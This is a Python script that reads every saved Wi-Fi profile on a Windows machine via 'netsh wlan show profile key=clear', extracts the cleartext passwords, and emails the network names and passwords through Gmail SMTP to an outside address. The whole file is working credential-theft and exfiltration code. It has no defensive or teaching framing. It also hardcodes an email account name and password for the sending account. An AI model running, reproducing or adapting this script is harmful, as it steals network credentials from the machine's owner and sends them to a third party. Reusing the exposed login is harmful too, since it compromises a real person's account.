import subprocess
import re
import smtplib
from email.message import EmailMessage
from termcolor import colored

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
wifi_list = list()

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                               capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

#########################
## Send Wifi Password Via Mail
#########################

import time

t1 = time.time()
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

try:
    email = 'abubakkar.swe@gmail.com'
    password = 'Abubakkar32'
    send_to_email = "rakibsarkar26@gmail.com"

    msg = EmailMessage()
    msg['Subject'] = 'WiFi SSIDs and Passwords'
    msg['From'] = email
    msg['To'] = send_to_email

    TEXT = email_message
    msg.set_content(TEXT)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.send_message(msg)
    print(colored(f'Successfully Mail Send to:- {send_to_email}', 'green'))
    server.quit()
    t2 = time.time()
    print(colored(f"Time take to send mail {t2-t1} sec", 'red'))
except:
    print("Opps!! Try Again Please")
